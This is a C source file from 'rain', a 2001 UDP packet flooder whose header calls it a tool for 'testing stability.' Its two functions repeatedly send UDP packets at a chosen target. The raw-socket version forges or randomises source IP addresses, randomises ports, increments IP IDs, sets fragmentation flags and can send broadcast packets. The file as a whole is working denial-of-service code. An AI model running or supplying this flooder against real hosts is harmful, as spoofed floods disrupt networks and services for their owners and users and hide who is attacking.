/*--------------------------------------------------*
 * $Header: /usr/src/Projects/rain/RCS/rain_udp.c,v 1.1 2001/06/11 20:44:09 root Exp root $
 * $Author: root $
 * rain_udp.c
 * rain - by Evil (mystic@tenebrous.com)
 * A flexible packet flooder for testing stability.
 * Copyright(c) 2001
 * Licensed under the GNU General Public License
 *
 * $Log: rain_udp.c,v $
 * Revision 1.1  2001/06/11 20:44:09  root
 * Initial revision
 *
 * Revision 1.1  2001/06/11 02:59:26  root
 * Initial revision
 *
 *-------------------------------------------------*/
#include "rain_common.h"


/*
 * udp_shower_normal():
 *
 * This sends non-spoofed UDP
 * packets to a target:port
 */
extern int
udp_shower_normal(struct sockaddr_in *target, struct pkt_info *pkt) {
  int sock;

  buffer = malloc(sizeof(char)*packetsize);
  if(!buffer) DieWithError("malloc()", ENOMEM);
  memset(buffer, pkt->filler, (sizeof(char)*packetsize));


  if((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0)
    DieWithError("UDP socket()", 0);


  /*
   * Allows broadcast messages if -b is specified
   */
   if(pkt->bcast == 1)
     setbcast(sock);


  /*
   * Cool. Let's send the packets:
   */
  while(packets_sent < pkt->num) {

    if(sendto(sock,
              buffer,
              strlen(buffer),
              0,
              (struct sockaddr*)target,
              sizeof(struct sockaddr_in)) < strlen(buffer)) DieWithError("sendto()", 0);

    usleep(pkt->delay);
    packets_sent++;
  }

  return 0;
}


/*
 * udp_shower():
 *
 * This sends fully customized UDP
 * packets to a target:port
 */
extern int
udp_shower(int raw_socket, struct sockaddr_in *source, struct sockaddr_in *target, struct pkt_info *pkt) {
  struct ipudp  *ip_udp;
  struct ip         *ip;
  struct udphdr    *udp;
  int i = 0; /* counter used in storing payload */


  packetsize -= sizeof(struct udphdr);


  /*
   * We use a global buffer to ward off memory leaks
   * it will be freed when the program exits         
   */
  buffer  = malloc(sizeof(char)*packetsize);
  if(!buffer) DieWithError("malloc()", ENOMEM);
  memset(buffer, pkt->filler, (sizeof(char)*packetsize));


  ip_udp = (struct ipudp*)buffer;
  ip = &ip_udp->ip;
  udp = &ip_udp->udp;


  /* 
   * store the user-specified string in the payload, 
   * if there is one.. 
   */
  if(ctoi(pkt->payload[0]) != 0) {
   printf("filling payload\n");
   for(; i < strlen(pkt->payload); i++)
     buffer[(sizeof(struct ip) + sizeof(struct udphdr)) + i] = pkt->payload[i];
  }

  pkt->tot_len = (sizeof(struct udphdr) + strlen(buffer));


  /*
   * Let's build the UDP header:
   */
  udp->uh_sport = htons(pkt->sport);
  udp->uh_dport = htons(pkt->dport);
  udp->uh_ulen  = BYTE_FIX(pkt->tot_len);
  udp->uh_sum   = in_cksum((u_short*)udp,sizeof(struct udphdr), 0);

  pkt->tot_len += sizeof(struct ip);


  /* 
   * Alright, now for the IP header
   */
  ip->ip_hl         = (sizeof(struct ip) >> 2);
  ip->ip_v          = 4;
  ip->ip_tos        = pkt->tos;
  ip->ip_len        = BYTE_FIX(pkt->tot_len);
  ip->ip_id         = BYTE_FIX(pkt->id);
  if(pkt->frag == 1) {
    ip->ip_off  = BYTE_FIX(pkt->frag_off); /* set fragment offset */
    ip->ip_off |= BYTE_FIX(IP_MF);  /* set more to come */
    if(pkt->frag_off == 0) ip->ip_off = 0x0;
  } else {
    ip->ip_off = 0x0;
  }
  if(pkt->dfrag == 1) ip->ip_off |= BYTE_FIX(IP_DF);  
  ip->ip_ttl        = pkt->ttl;
  ip->ip_p          = IPPROTO_UDP;
  if(strcmp(pkt->saddr,"127.0.0.1") == 0)
    ip->ip_src.s_addr = INADDR_ANY;
  else
    ip->ip_src.s_addr = source->sin_addr.s_addr;
  ip->ip_dst.s_addr = target->sin_addr.s_addr;
  ip->ip_sum        = 0x0;
  ip->ip_sum        = in_cksum((u_int16_t*)ip,sizeof(struct ip), 0);


  /*
   * Right on. Let's send the packets.
   */
  while(packets_sent < pkt->num) {
    if(sendto(raw_socket,
              ip_udp,
              pkt->tot_len,
              0,
              (struct sockaddr*)target,
              sizeof(struct sockaddr_in)) < 0) return -1;
    packets_sent++;


    /* 
     * For random IP 
     */
    if(pkt->randip == 1) {
      ip->ip_src.s_addr = rand();
      ip->ip_sum = in_cksum((u_int16_t*)ip,sizeof(struct ip), 0);
    }

    /* 
     * for id overloading: 
     */
    if(pkt->id_of == 1) { 
      ip->ip_id++; 
      ip->ip_id = BYTE_FIX(ip->ip_id) ; 
      ip->ip_sum = in_cksum((u_short*)ip, sizeof(struct ip), 0); 
    }
    
    /* 
     * for random ports 
     */
    if(pkt->rsport == 1) { 
      udp->uh_sport = htons((rand()%MAXPORT)); 
      udp->uh_sum = in_cksum((u_short*)udp, sizeof(struct udphdr),0); 
    }

    if(pkt->rdport == 1) {
      udp->uh_dport = htons((rand()%MAXPORT)); 
      udp->uh_sum = in_cksum((u_short*)udp, sizeof(struct udphdr),0); 
    }
 

    usleep(pkt->delay);
  }


  return 0;
}



/* EOF */
